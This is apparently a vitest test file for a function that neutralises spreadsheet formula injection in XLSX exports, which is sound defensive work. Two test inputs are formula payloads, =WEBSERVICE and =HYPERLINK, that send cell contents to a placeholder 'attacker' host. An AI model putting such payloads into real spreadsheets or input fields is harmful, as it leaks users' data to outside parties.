import { describe, it, expect } from 'vitest'
import { sanitizeExcelCell } from '../lib/safeXlsx'

// XLSX cells whose text starts with = + - @ TAB or CR are evaluated as
// formulas when the client opens the sheet. A user-entered field written
// straight through can exfiltrate row data via =WEBSERVICE(...) or
// =HYPERLINK(...). The export paths (CORList, CORLog) pass every string
// through sanitizeExcelCell, which prefixes a single quote on the
// dangerous leading characters.

describe('sanitizeExcelCell', () => {
  it('neutralizes a leading = so the cell is not a formula', () => {
    expect(sanitizeExcelCell('=WEBSERVICE("https://attacker/"&A1)')).toBe(
      "'=WEBSERVICE(\"https://attacker/\"&A1)"
    )
  })

  it('neutralizes a leading = HYPERLINK that would exfiltrate on click', () => {
    expect(sanitizeExcelCell('=HYPERLINK("https://attacker/"&A1,"click")')).toBe(
      "'=HYPERLINK(\"https://attacker/\"&A1,\"click\")"
    )
  })

  it('neutralizes the other leading formula triggers', () => {
    expect(sanitizeExcelCell('+1+1')).toBe("'+1+1")
    expect(sanitizeExcelCell('-1-1')).toBe("'-1-1")
    expect(sanitizeExcelCell('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(sanitizeExcelCell('\t=1+1')).toBe("'\t=1+1")
    expect(sanitizeExcelCell('\r=1+1')).toBe("'\r=1+1")
  })

  it('leaves ordinary text alone', () => {
    expect(sanitizeExcelCell('Change Order 42')).toBe('Change Order 42')
    expect(sanitizeExcelCell('Level 3 — East')).toBe('Level 3 — East')
    expect(sanitizeExcelCell('')).toBe('')
  })

  it('passes numbers through unchanged (they cannot carry a formula)', () => {
    expect(sanitizeExcelCell(0)).toBe(0)
    expect(sanitizeExcelCell(-125.5)).toBe(-125.5)
    expect(sanitizeExcelCell(42)).toBe(42)
  })

  it('passes null and undefined through unchanged', () => {
    expect(sanitizeExcelCell(null)).toBe(null)
    expect(sanitizeExcelCell(undefined)).toBe(undefined)
  })
})
